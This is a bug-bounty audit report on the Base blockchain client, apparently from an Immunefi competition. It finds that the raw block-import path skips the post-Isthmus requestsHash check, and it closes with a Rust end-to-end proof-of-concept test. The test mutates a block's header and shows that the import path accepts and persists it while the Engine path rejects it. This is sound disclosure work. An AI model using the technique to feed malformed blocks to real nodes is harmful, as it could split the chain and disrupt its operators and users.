# 74678 bc medium missing requests hash validation in the raw import path can persist invalid post isthmus blocks and cause chain split

Submitted on Apr 24th 2026 at 07:28:38 UTC by @OxPrince for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74678
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

## Brief/Intro

After Isthmus, Base requires every block header to carry `requestsHash = sha256("")`. The Engine/spec-facing path enforces that rule, but the raw sync/import path does not. As a result, the same malformed post-Isthmus block can be rejected by one execution path and accepted, persisted, and later served as canonical by another. This creates a real block-validity differential inside the execution client and can lead to unintended chain split if different nodes or code paths disagree on the same block.

## Vulnerability Details

The local Isthmus spec is explicit:

* before Isthmus, `requestsHash` must be omitted
* after Isthmus, `requestsHash` must equal `sha256("")`

See [exec-engine.md](broken://pages/5f81deb1d9e61df9940e47c6d0b03e8d87e65a19) and [exec-engine.md](broken://pages/8c62f0e0fc0f9d8bb489336df37f0c9a9d6a6ecd).

The Engine/spec-facing path follows that rule. In [payload/mod.rs](broken://pages/2713fc16c87bfa6410618f6382ca65684809d29c), non-empty execution requests are rejected and `header.requests_hash` is only accepted as `EMPTY_REQUESTS_HASH`.

The raw sync/import path does not enforce the same invariant:

* [OpBeaconConsensus::validate\_header](broken://pages/2c22be10a3d55d21e3411938391e27b6b52718c7) validates nonce, ommers, extra-data, gas, and base fee, but never inspects `requests_hash`.
* [validate\_header\_against\_parent](broken://pages/26ad0e0e89e241a9d82ef6e3e527a3217f0ce4e5) validates parent linkage, timestamp, base fee, and blob fields, but not `requests_hash`.
* [validate\_block\_post\_execution](broken://pages/4351e5f1f3adce20f7903546680a737d59886db6) validates receipts, gas usage, and Jovian blob gas, but never compares executed requests to the header hash.

I first confirmed the acceptance gap with a focused regression test at [lib.rs](broken://pages/f8a3e54d6f9f376edc8c83f69decff02f7701dac), `test_isthmus_sync_validation_accepts_non_empty_requests_hash`, which proves a post-Isthmus block with an arbitrary non-empty `requests_hash` still passes all sync-facing consensus checks.

I then upgraded the proof to an end-to-end import/boot PoC\
see below

PoC does the following:

1. Launches a real local Base execution node with an Isthmus-active chain spec.
2. Mines a valid post-Isthmus block and confirms it carries the correct empty `requests_hash`.
3. Mutates only `header.requests_hash` to `0x1111...1111` in [import.rs](broken://pages/5e7aa7b7284ceb05c255389fdf316e2ec815ab19).
4. Confirms the Engine/spec-facing path rejects that same malformed block via `BasePayloadError::NonEmptyELRequests` in [import.rs](broken://pages/a4eb03f25984d8d90dc44b41c0e5a027c8f510ce).
5. Writes the malformed block to raw RLP and feeds it into the real historical import path via `import_blocks_from_file(...)` in [import.rs](broken://pages/55d13515fe79d3de885c4d71cb29119406b37a28).
6. Verifies the import path accepts and persists the malformed block in [import.rs](broken://pages/51350a3ccfae7da9f6a3b4715b989e86d58d73f9).
7. Reboots a fresh node from the imported datadir and verifies the malformed header is served as canonical in [import.rs](broken://pages/ad131e19cd5201c6de19ece582490c7a5b631390).

## Impact Details

This proves the issue is not just a missing assertion in isolation. A malformed post-Isthmus block is rejected on one execution path but accepted, persisted, and later re-served as canonical on another.

Why this fits:

* Post-Isthmus block validity depends on whether a node/path enforces `requestsHash == sha256("")`.
* The Engine/spec-facing path rejects the malformed block, while the raw import path accepts it.
* The e2e PoC proves that acceptance is durable: the malformed block is persisted and a rebooted node serves it as canonical state.

Once different nodes or execution paths disagree on whether the same block is valid, they can follow different histories. Because this is a rule disagreement rather than a temporary networking issue, recovery can require coordinated operator action, rollback, or hard-fork-style reconciliation.

This is stronger than a mere informational inconsistency because:

* it affects a real sync/import path
* it changes canonical state
* it survives restart
* it can create incompatible views of the chain

## References

* Isthmus header validity rules: [exec-engine.md](broken://pages/5f81deb1d9e61df9940e47c6d0b03e8d87e65a19)
* Isthmus block sealing rule that `requestsHash` is always `sha256("")`: [exec-engine.md](broken://pages/8c62f0e0fc0f9d8bb489336df37f0c9a9d6a6ecd)
* Engine/spec-facing enforcement: [payload/mod.rs](broken://pages/2713fc16c87bfa6410618f6382ca65684809d29c)
* Missing sync/import validation in header checks: [lib.rs](broken://pages/2c22be10a3d55d21e3411938391e27b6b52718c7)
* Missing sync/import validation against parent: [lib.rs](broken://pages/26ad0e0e89e241a9d82ef6e3e527a3217f0ce4e5)
* Missing post-execution validation: [validation/mod.rs](broken://pages/4351e5f1f3adce20f7903546680a737d59886db6)
* Focused regression proof: [lib.rs](broken://pages/f8a3e54d6f9f376edc8c83f69decff02f7701dac)

## Proof of Concept

```rust
//! End-to-end import tests for the execution node.

use std::{fs::File, io::Write, sync::Arc, time::Duration};

use alloy_eips::eip7685::EMPTY_REQUESTS_HASH;
use alloy_genesis::Genesis;
use alloy_primitives::{B64, B256};
use base_common_consensus::HoloceneExtraData;
use base_common_rpc_types_engine::{BasePayloadError, ExecutionData};
use base_execution_chainspec::{BASE_MAINNET, BaseChainSpec, BaseChainSpecBuilder};
use base_execution_consensus::OpBeaconConsensus;
use base_execution_evm::BaseExecutorProvider;
use base_execution_payload_builder::OpPayloadBuilderAttributes;
use base_node_core::{BaseNode, utils::optimism_payload_attributes};
use reth_chainspec::BaseFeeParams;
use reth_cli_commands::import_core::{ImportConfig, import_blocks_from_file};
use reth_config::Config;
use reth_db::{DatabaseEnv, init_db, test_utils::create_test_rw_db_with_path};
use reth_db_common::init::init_genesis;
use reth_e2e_test_utils::{
    node::NodeTestContext, transaction::TransactionTestContext, wallet::Wallet,
};
use reth_node_api::NodeTypesWithDBAdapter;
use reth_node_builder::{EngineNodeLauncher, Node, NodeBuilder, NodeHandle};
use reth_node_core::args::{DatabaseArgs, DatadirArgs};
use reth_provider::{
    DatabaseProviderFactory, HeaderProvider,
    providers::{BlockchainProvider, ProviderFactory, RocksDBProvider, StaticFileProvider},
};
use reth_primitives_traits::Block;
use reth_tasks::Runtime;
use tokio::sync::Mutex;

fn isthmus_chain_spec() -> Arc<BaseChainSpec> {
    let mut genesis: Genesis = serde_json::from_str(include_str!("../assets/genesis.json")).unwrap();
    genesis.extra_data =
        HoloceneExtraData::encode(B64::ZERO, BaseFeeParams::optimism_canyon()).unwrap().into();
    let mut chain_spec = BaseChainSpecBuilder::default()
        .chain(BASE_MAINNET.chain)
        .genesis(genesis)
        .isthmus_activated()
        .build();
    chain_spec.inner.base_fee_params = BASE_MAINNET.base_fee_params.clone();
    Arc::new(chain_spec)
}

fn isthmus_payload_attributes<T>(timestamp: u64) -> OpPayloadBuilderAttributes<T> {
    let mut attrs = optimism_payload_attributes(timestamp);
    attrs.eip_1559_params = Some(B64::ZERO);
    attrs
}

#[tokio::test]
async fn test_isthmus_import_accepts_non_empty_requests_hash_and_boots_node() -> eyre::Result<()> {
    reth_tracing::init_test_tracing();

    let chain_spec = isthmus_chain_spec();
    let malformed_block = {
        let mut config = reth_node_builder::NodeConfig::new(Arc::clone(&chain_spec))
            .with_unused_ports()
            .with_disabled_discovery()
            .with_datadir_args(DatadirArgs {
                datadir: reth_db::test_utils::tempdir_path().into(),
                ..Default::default()
            });
        config.network.discovery.discv5_port = 0;
        config.network.discovery.discv5_port_ipv6 = 0;
        let db = create_test_rw_db_with_path(
            config
                .datadir
                .datadir
                .unwrap_or_chain_default(config.chain.chain(), config.datadir.clone())
                .db(),
        );
        let runtime = Runtime::test();
        let node_handle = NodeBuilder::new(config.clone())
            .with_database(db)
            .with_types_and_provider::<BaseNode, BlockchainProvider<_>>()
            .with_components(BaseNode::default().components())
            .with_add_ons(BaseNode::new(Default::default()).add_ons())
            .launch_with_fn(|builder| {
                let launcher = EngineNodeLauncher::new(
                    runtime.clone(),
                    builder.config.datadir(),
                    Default::default(),
                );
                builder.launch_with(launcher)
            })
            .await?;

        let mut node = NodeTestContext::new(node_handle.node, isthmus_payload_attributes).await?;
        let wallet = Arc::new(Mutex::new(Wallet::default().with_chain_id(chain_spec.chain().into())));

        let mut payloads = node
            .advance(1, |_| {
                Box::pin({
                    let wallet = Arc::clone(&wallet);
                    async move {
                        let mut wallet = wallet.lock().await;
                        let tx_fut = TransactionTestContext::optimism_l1_block_info_tx(
                            wallet.chain_id,
                            wallet.inner.clone(),
                            wallet.inner_nonce,
                        );
                        wallet.inner_nonce += 1;
                        tx_fut.await
                    }
                })
            })
            .await?;

        let valid_block = payloads.pop().expect("expected one mined block").block().clone();
        assert_eq!(
            valid_block.header().requests_hash,
            Some(EMPTY_REQUESTS_HASH),
            "source node should produce a valid Isthmus block before mutation"
        );

        let mut malformed_block = valid_block.unseal();
        malformed_block.header.requests_hash = Some(B256::repeat_byte(0x11));
        Block::seal_slow(malformed_block)
    };

    let execution_data = ExecutionData::from_block_slow(&malformed_block.clone().unseal());
    assert!(
        matches!(
            execution_data
                .payload
                .clone()
                .into_block_with_sidecar_raw(&execution_data.sidecar),
            Err(BasePayloadError::NonEmptyELRequests)
        ),
        "Engine/spec-facing payload decoding should reject the same malformed requests_hash"
    );

    let rlp_path = reth_db::test_utils::tempdir_path().join("isthmus_bad_requests_hash.rlp");
    let mut rlp_file = File::create(&rlp_path)?;
    let encoded = alloy_rlp::encode(malformed_block.clone().unseal());
    rlp_file.write_all(&encoded)?;
    rlp_file.flush()?;

    let datadir = reth_db::test_utils::tempdir_path();
    let db_path = datadir.join("db");
    let static_files_path = datadir.join("static_files");
    let rocksdb_dir_path = datadir.join("rocksdb");

    let db_args = DatabaseArgs::default().database_args();
    let db = init_db(&db_path, db_args)?;
    let provider_factory: ProviderFactory<NodeTypesWithDBAdapter<BaseNode, DatabaseEnv>> =
        ProviderFactory::new(
            db.clone(),
            Arc::clone(&chain_spec),
            StaticFileProvider::read_write(static_files_path.clone())?,
            RocksDBProvider::builder(rocksdb_dir_path.clone())
                .with_default_tables()
                .build()
                .expect("failed to create RocksDB provider"),
            Runtime::test(),
        )?;

    init_genesis(&provider_factory)?;

    let import_result = import_blocks_from_file(
        &rlp_path,
        ImportConfig::default(),
        provider_factory.clone(),
        &Config::default(),
        BaseExecutorProvider::optimism(Arc::clone(&chain_spec)),
        Arc::new(OpBeaconConsensus::new(Arc::clone(&chain_spec))),
    )
    .await?;

    assert_eq!(
        import_result.total_imported_blocks, 1,
        "historical import should ingest the malformed post-Isthmus block"
    );
    assert!(
        !import_result.stopped_on_invalid_block,
        "current import path should not recognize the malformed requests_hash as invalid"
    );

    let imported_header = provider_factory
        .database_provider_ro()?
        .header_by_number(1)?
        .expect("imported block should be present");
    assert_eq!(
        imported_header.requests_hash,
        Some(B256::repeat_byte(0x11)),
        "imported canonical header should preserve the malformed non-empty requests_hash"
    );

    drop(provider_factory);
    drop(db);
    tokio::time::sleep(Duration::from_millis(100)).await;

    let mut node_config = reth_node_builder::NodeConfig::new(Arc::clone(&chain_spec))
        .with_unused_ports()
        .with_disabled_discovery()
        .with_datadir_args(DatadirArgs { datadir: datadir.clone().into(), ..Default::default() });
    node_config.network.discovery.discv5_port = 0;
    node_config.network.discovery.discv5_port_ipv6 = 0;
    let runtime = Runtime::test();
    let NodeHandle { node, node_exit_future: _ } = NodeBuilder::new(node_config.clone())
        .testing_node_with_datadir(runtime.clone(), datadir.clone())
        .with_types_and_provider::<BaseNode, BlockchainProvider<_>>()
        .with_components(BaseNode::default().components())
        .with_add_ons(BaseNode::new(Default::default()).add_ons())
        .launch_with_fn(|builder| {
            let launcher =
                EngineNodeLauncher::new(runtime.clone(), builder.config().datadir(), Default::default());
            builder.launch_with(launcher)
        })
        .await?;

    let booted_header = node
        .provider
        .header_by_number(1)?
        .expect("restarted node should expose imported malformed tip");
    assert_eq!(booted_header.hash_slow(), malformed_block.hash());
    assert_eq!(booted_header.requests_hash, Some(B256::repeat_byte(0x11)));

    Ok(())
}
```
